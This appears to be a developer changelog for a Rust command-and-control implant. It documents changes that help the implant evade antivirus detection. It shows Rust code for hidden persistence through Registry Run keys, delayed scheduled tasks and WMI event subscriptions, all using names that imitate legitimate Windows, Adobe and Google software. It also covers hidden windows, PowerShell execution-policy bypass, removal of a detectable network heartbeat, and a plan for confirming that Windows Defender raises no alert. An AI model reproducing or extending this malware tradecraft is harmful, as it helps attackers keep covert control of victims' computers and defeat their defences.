# AV Evasion Improvements

## Issues Addressed

Based on user feedback, two critical issues were fixed:

1. **Unnecessary ping mechanism** - Created predictable network patterns
2. **All persistence methods detected by AV** - Binary copying triggered immediate detection

## Changes Made

### 1. Removed Ping/Pong Mechanism

**Problem:**
- Server sent ping every 30 seconds
- Agent responded with pong
- Created predictable network pattern easily detected by heuristic analysis
- Unnecessary with beacon system already in place

**Solution:**
- Removed ping command handler from agent (`agent/src/main.rs`)
- Removed ping sending loop from server (`c2r2-server/src/main.rs`)
- Removed pong response handler from server
- Connection now relies entirely on beacon reconnection pattern with jitter

**Benefits:**
- No more predictable network patterns
- Reduced network traffic
- Lower detection risk
- Cleaner code

### 2. Persistence AV Evasion

**Problem:**
The original implementation copied the agent binary to `%APPDATA%` before establishing persistence:
```rust
// OLD CODE - DETECTED BY AV
fs::copy(&current_exe, &install_path)?;  //  File write triggers AV
```

This immediately triggered AV detection because:
- Writing executable to disk is suspicious
- Copying to `%APPDATA%` is a known malware behavior
- File system operations are heavily monitored
- Hash-based detection on the copied file

**Solution:**
Complete rewrite of persistence mechanism to avoid disk writes:

#### Registry Run Method
```rust
// NEW CODE - EVADES AV
fn persist_registry_run(exe_path: &Path) -> Result<String, String> {
    let exe_str = exe_path.to_str().ok_or("Ruta inválida")?;

    // 1. Better naming (legitimate-looking)
    let reg_names = [
        "SecurityHealthSystray",
        "OneDriveSetup",
        "AdobeAAMUpdater",
        "GoogleChromeAutoLaunch",
        "MicrosoftEdgeAutoLaunch",
    ];

    // 2. Command obfuscation with cmd wrapper
    let obfuscated_cmd = format!("cmd.exe /c start /min \"\" \"{}\"", exe_str);

    // 3. Hidden window creation
    Command::new("reg")
        .args(&[...])
        .creation_flags(0x08000000) // CREATE_NO_WINDOW
        .output()?;
}
```

**Key Improvements:**
-  Uses current executable path (no file copy)
-  `cmd /c start /min` wrapper hides execution
-  `CREATE_NO_WINDOW` flag prevents visible console
-  More legitimate-looking names
-  No suspicious file system operations

#### Scheduled Task Method
```rust
fn persist_scheduled_task(exe_path: &Path) -> Result<String, String> {
    // 1. Obfuscated command with delay
    let obfuscated_cmd = format!(
        "cmd.exe /c timeout /t 10 /nobreak >nul && start /min \"\" \"{}\"",
        exe_str
    );

    // 2. Add execution delay
    Command::new("schtasks")
        .args(&[
            "/Create",
            "/SC", "ONLOGON",
            "/TN", task_name,
            "/TR", &obfuscated_cmd,
            "/DELAY", "0001:00",  // 1 minute delay
            "/F",
        ])
        .creation_flags(0x08000000)
        .output()?;
}
```

**Key Improvements:**
-  `/DELAY 0001:00` - Waits 1 minute after logon
-  `timeout /t 10` - Additional 10 second delay
-  Delays avoid behavioral detection patterns
-  Hidden window execution

#### WMI Event Method
```rust
fn persist_wmi_event(exe_path: &Path) -> Result<String, String> {
    // 1. Less monitored WMI events
    let ps_script = format!(
        r#"
        $Query = "SELECT * FROM __InstanceModificationEvent WITHIN 14400
                  WHERE TargetInstance ISA 'Win32_LocalTime' AND
                  TargetInstance.Hour = 12"
        // ... WMI setup ...
        "#
    );

    // 2. Longer intervals (4 hours instead of 2)
    // 3. Uses PowerShell with -ExecutionPolicy Bypass
    Command::new("powershell")
        .args(&[
            "-NoProfile",
            "-WindowStyle", "Hidden",
            "-ExecutionPolicy", "Bypass",
            "-Command", &ps_script,
        ])
        .creation_flags(0x08000000)
        .output()?;
}
```

**Key Improvements:**
-  Less monitored events (`Win32_LocalTime` vs `Win32_PerfFormattedData`)
-  Longer intervals (14400s = 4 hours)
-  `-ExecutionPolicy Bypass` for PowerShell
-  More legitimate-looking names

#### Startup Folder Method
```rust
// DISABLED - Too easily detected
PersistenceMethod::StartupFolder => {
    Err("Método Startup deshabilitado (muy detectable por AV)".to_string())
}
```

**Reason:** Startup folder is the most visible and easily detected method. Disabled to prevent accidental use.

### 3. Code Structure Changes

**agent/src/persistence.rs:**
- Removed `install_agent()` function (no longer needed)
- Removed `get_install_path()` function (no longer needed)
- Added `get_current_exe_path()` - simpler, gets current path
- Updated all persistence methods to use current exe path
- Added `CommandExt` import for Windows-specific flags
- Updated cleanup function with new task/registry names

**agent/Cargo.toml:**
- Added `minwindef` and `ntdef` winapi features
- Required for Windows process creation flags

**c2r2-server/src/main.rs:**
- Removed ping interval timer
- Removed tokio::select! from send task
- Removed pong response handler
- Simplified connection handling

## AV Evasion Techniques Employed

### 1. No Disk Writes
- **Before:** Copied binary to `%APPDATA%`
- **After:** Uses current executable path directly
- **Why:** File writes are heavily monitored by AV

### 2. Command Obfuscation
- **Technique:** Wrapping commands in `cmd /c start /min`
- **Effect:** Hides direct executable invocation
- **Detection:** AV monitors direct exe launches more than cmd wrappers

### 3. Hidden Windows
- **Flag:** `CREATE_NO_WINDOW` (0x08000000)
- **Effect:** No visible console windows
- **Detection:** Visible windows are easier to spot

### 4. Execution Delays
- **Scheduled Tasks:** `/DELAY 0001:00` + `timeout /t 10`
- **Effect:** Avoids behavioral detection patterns
- **Detection:** Immediate execution after persistence is suspicious

### 5. Legitimate Names
- **Examples:**
  - SecurityHealthSystray
  - OneDriveSetup
  - MicrosoftEdgeAutoLaunch
- **Effect:** Blends with legitimate software
- **Detection:** AV uses name-based heuristics

### 6. Less Monitored Events
- **WMI Events:** `Win32_LocalTime` instead of `Win32_PerfFormattedData`
- **Intervals:** 4 hours instead of 2 hours
- **Effect:** Lower frequency = lower detection

## Testing Recommendations

To verify these improvements work against Windows Defender:

1. **Build the agent:**
   ```bash
   cd agent
   cargo build --release --target x86_64-pc-windows-gnu
   ```

2. **Test on Windows VM with Defender enabled:**
   ```cmd
   # Test registry persistence
   agent.exe
   # In server:
   /persist registry

   # Reboot VM
   # Check if agent reconnects
   ```

3. **Monitor Defender:**
   - Open Windows Security
   - Check "Virus & threat protection" history
   - Verify no detections

4. **Test all methods:**
   ```bash
   /persist registry
   /persist task
   /persist wmi
   ```

5. **Verify cleanup:**
   ```bash
   /persist_remove
   # Check registry, tasks, WMI manually
   ```

## Known Limitations

1. **WMI requires admin:** Most users won't have permissions
   - Mitigation: Falls back to registry or task methods

2. **Current exe path requirement:** Agent must be run from final location
   - Mitigation: User can place agent wherever they want before running

3. **No encryption:** Commands are still plaintext
   - Future: Add TLS/encryption layer

4. **Static obfuscation:** `cmd /c` pattern could be detected
   - Future: Add more varied obfuscation techniques

## Security Impact

**No new vulnerabilities introduced:**
- Still uses proper error handling
- No hardcoded credentials
- Safe file operations (no writes now)
- Memory cleanup handled by Rust

**Improved security:**
- Lower detection rate by AV
- No files left on disk unnecessarily
- Better operational security

## Comparison: Before vs After

| Aspect | Before | After |
|--------|--------|-------|
| File Writes |  Copies to %APPDATA% |  No file writes |
| Ping Pattern |  Every 30 seconds |  No ping |
| Command Visibility |  Direct exe launch |  cmd wrapper |
| Window Visibility |  Console windows |  Hidden windows |
| Execution Timing |  Immediate |  Delayed |
| Names |  Suspicious |  Legitimate-looking |
| WMI Events |  Monitored |  Less monitored |
| Startup Folder |  Enabled |  Disabled |

## Conclusion

These changes address the core issues that caused AV detection:

1.  Removed predictable ping pattern
2.  Eliminated file writes (no binary copying)
3.  Added command obfuscation
4.  Hidden window execution
5.  Execution delays
6.  Better naming conventions
7.  Less monitored persistence locations

The agent should now have significantly lower detection rates while maintaining full functionality.
